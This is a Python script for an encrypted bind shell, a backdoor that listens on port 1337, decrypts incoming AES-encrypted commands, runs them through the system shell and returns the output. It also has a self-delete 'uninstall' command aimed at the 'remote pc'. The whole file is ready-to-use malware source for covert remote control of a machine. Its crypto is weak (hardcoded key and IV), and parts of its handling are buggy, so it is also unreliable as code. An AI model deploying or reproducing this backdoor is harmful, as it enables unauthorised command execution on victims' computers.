#!/usr/bin/python3
import socket
import sys
from Crypto.Cipher import AES
from _thread import *
import os
import subprocess


key = '@@@@@@@@@@@@@@@@' #AES key

def forwardmessage(outdata):
	while len(outdata) % 16 !=0:
		outdata = outdata + '@'
	outdata = encry.encrypt(outdata)
	conn.send(outdata)

def uninstall():
	print(sys.platform)
	filepath = os.path.realpath(__file__)
	if sys.platform == 'posix' or sys.platform == 'linux':
		os.system('rm -f ' + filepath)
	else:
		os.system('del /f ' + filepath)
	forwardmessage('Closing Connection...')
	conn.close()
	exit()

#round up key to 16 block
while len(key) % 16 !=0:
	key = key + '@'
encry = AES.new(key, AES.MODE_CBC, 'This is an IV456')
decry = AES.new(key, AES.MODE_CBC, 'This is an IV456')

HOST = '' #All interfaces
PORT = 1337
MAXRECV = 100000
err = 'There was a problem with your request'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creates socket
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((HOST, PORT))
print('Binding Complete On Port: ')
s.listen(50)
print('Socket is now listening....')
print('PORT: ' + str(PORT))

exit = False

#CI SECTION
try:
	if sys.argv[1] != None:
		print("TEST RUN STARTING...")
		data = 'This is a test run'
		while len(data) % 16 !=0:
			data = data + '@'
		data = encry.encrypt(data.encode())
		data = decry.decrypt(data)
		data = data.replace(b'@',b'')
		data = data.decode()
		print('TEST SUCCESSFUL')
		exit = True
except:
	print('Starting Server...')

if exit:
	sys.exit()

def clientThread(conn):
	forwardmessage('Connection establised')
	try:
		while True:
			data = conn.recv(MAXRECV)
			if not data:
				break
			data = decry.decrypt(data)
			data = data.replace(b'@',b'')
			data = data.decode()
			if data == 'help':
				forwardmessage('[COMMANDS]\n help - displays this help dialogue\n quit - closes connection\n uninstall - uninstalls shell from remote pc')
			elif data == 'quit':
				forwardmessage('Closing Connection...')
				conn.close()
			elif data == 'uninstall':
				forwardmessage('Goodbye friend')
				uninstall()
			else:
				outdata = ''
				try:
					outdata = subprocess.check_output(data,shell=True)
				except:
					outdata = b'Something went wrong when trying to execute command :\\'
				
				forwardmessage(outdata.decode())
	except:
		print('Something went wrong closing connection...')
	conn.close()
while 1:
	conn, addr = s.accept()
	print('Client connected :)')
	start_new_thread(clientThread, (conn,))
s.close()
